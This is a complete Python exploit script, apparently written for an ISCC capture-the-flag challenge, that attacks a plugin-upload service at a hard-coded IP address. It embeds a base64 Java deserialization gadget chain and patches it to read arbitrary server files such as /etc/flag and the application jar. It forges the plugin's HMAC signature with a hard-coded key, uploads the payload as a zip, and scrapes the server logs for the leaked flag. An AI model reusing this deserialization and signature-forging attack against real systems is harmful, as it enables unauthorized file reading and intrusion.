#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Agent插件管理系统 - 纯Python利用（唯一日志桶 + 流式搜真flag）"""

import base64
import hmac
import hashlib
import io
import json
import re
import struct
import time
import uuid
import zipfile

import requests


TARGET = "http://39.105.213.28:9000"
KEY = b"k3y_5A62_X86"

# ResourceRefresher -> DataStream -> FileExporter(teamId=admin, targetPath=/etc/flag)
B64 = (
    "rO0ABXNyADJjb20uYWdlbnQudXBkYXRlLmRlc2VyaWFsaXphdGlvbi5SZXNvdXJjZVJl"
    "ZnJlc2hlcgAAAAAAAAABAgACTAAKZGF0YVN0cmVhbXQALUxjb20vYWdlbnQvdXBkYXRl"
    "LmRlc2VyaWFsaXphdGlvbi9EYXRhU3RyZWFtO0wACnRhcmdldFBhdGh0ABJMamF2YS9s"
    "YW5nL1N0cmluZzt4cHNyACtjb20uYWdlbnQudXBkYXRlLmRlc2VyaWFsaXphdGlvbi5E"
    "YXRhU3RyZWFtAAAAAAAAAAECAAJMAAhleHBvcnRlcnQAL0xjb20vYWdlbnQvdXBkYXRl"
    "LmRlc2VyaWFsaXphdGlvbi9GaWxlRXhwb3J0ZXI7TAAJaW5wdXRQYXRocQB+AAJ4cHNy"
    "AC1jb20uYWdlbnQudXBkYXRlLmRlc2VyaWFsaXphdGlvbi5GaWxlRXhwb3J0ZXIAAAAA"
    "AAAAAQIAAUwABnRlYW1JZHEAfgACeHB0AAVhZG1pbnB0AAkvZXRjL2ZsYWc="
)


def patch_payload(path: str, team: str) -> bytes:
    """Patch the serialized ResourceRefresher payload with a custom path and 5-char team."""
    if len(team) != 5:
        raise ValueError("team_id must be exactly 5 ASCII chars")

    raw = base64.b64decode(B64)

    if raw.count(b"admin") != 1:
        raise ValueError("unexpected payload layout: teamId marker not unique")
    raw = raw.replace(b"admin", team.encode(), 1)

    idx = raw.rfind(b"/etc/flag")
    if idx == -1:
        raise ValueError("unexpected payload layout: /etc/flag marker missing")

    path_bytes = path.encode()
    # Serialized Java String: TC_STRING(0x74) + u16 length + bytes
    raw = raw[: idx - 3] + b"\x74" + struct.pack(">H", len(path_bytes)) + path_bytes
    return raw


def hmac_sig(data: bytes) -> str:
    return base64.b64encode(hmac.new(KEY, data, hashlib.sha256).digest()).decode()


def make_zip(payload: bytes) -> bytes:
    manifest = {
        "pluginName": "x",
        "version": "1.0",
        "hmacSignature": hmac_sig(payload),
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("metadata.ser", payload)
    return buf.getvalue()


def upload_plugin(zdata: bytes, team: str) -> requests.Response:
    return requests.post(
        f"{TARGET}/api/upload?team_id={team}",
        files={"file": ("p.zip", io.BytesIO(zdata), "application/zip")},
        timeout=30,
    )


def iter_flag_candidates(stream, max_bytes=30 * 1024 * 1024):
    """Stream JSON/log chunks and yield any ISCC{...} strings found."""
    buf = ""
    total = 0
    for chunk in stream.iter_content(chunk_size=8192, decode_unicode=True):
        if not chunk:
            continue
        total += len(chunk)
        buf += chunk

        for m in re.finditer(r"ISCC\{[^}\r\n]{1,128}\}", buf):
            yield m.group(0)

        # Keep only a sliding window so memory stays bounded.
        if len(buf) > 32768:
            buf = buf[-32768:]

        if total >= max_bytes:
            break


def read_logs(team: str, max_bytes=30 * 1024 * 1024):
    r = requests.get(
        f"{TARGET}/api/logs?team_id={team}",
        stream=True,
        timeout=15,
        headers={"Connection": "close", "Cache-Control": "no-cache"},
    )
    r.raise_for_status()
    found = []
    for cand in iter_flag_candidates(r, max_bytes=max_bytes):
        found.append(cand)
    return found


def try_path(path: str):
    team = "t" + uuid.uuid4().hex[:4]
    print(f"[*] 触发路径: {path} (team_id={team})")
    payload = patch_payload(path, team)
    zdata = make_zip(payload)
    resp = upload_plugin(zdata, team)
    print(f"    上传状态: {resp.status_code}")
    if resp.text:
        print(f"    响应片段: {resp.text[:120]}")

    # Give the app a moment to finish deserialization and write logs.
    time.sleep(1.5)
    flags = read_logs(team)
    real = [f for f in flags if "f4k3" not in f and "d3c0y" not in f]
    return team, flags, real


def main():
    print("=" * 58)
    print("Agent插件管理系统 - 纯Python利用（唯一日志桶版）")
    print("=" * 58)

    # 先验证链子仍然有效，再打真实目标。
    probe_paths = [
        "/etc/flag",
        "/opt/app/flag",
        "/app/agent-update-system.jar",
    ]

    all_seen = []
    for path in probe_paths:
        try:
            team, flags, real = try_path(path)
            all_seen.extend(flags)
            if real:
                print(f"\n[+] team_id={team} 发现真flag:")
                for f in real:
                    print(f"    {f}")
                return
            if flags:
                print(f"    命中候选: {flags[:5]}")
            else:
                print("    当前日志桶未看到 ISCC 模式")
        except Exception as exc:
            print(f"    [!] 失败: {type(exc).__name__}: {exc}")

    uniq = []
    for f in all_seen:
        if f not in uniq:
            uniq.append(f)

    print("\n[-] 本轮没有打出真flag。看到的候选有:")
    for f in uniq:
        print(f"    {f}")
    if not uniq:
        print("    （没有任何 ISCC 模式回显）")


if __name__ == "__main__":
    main()
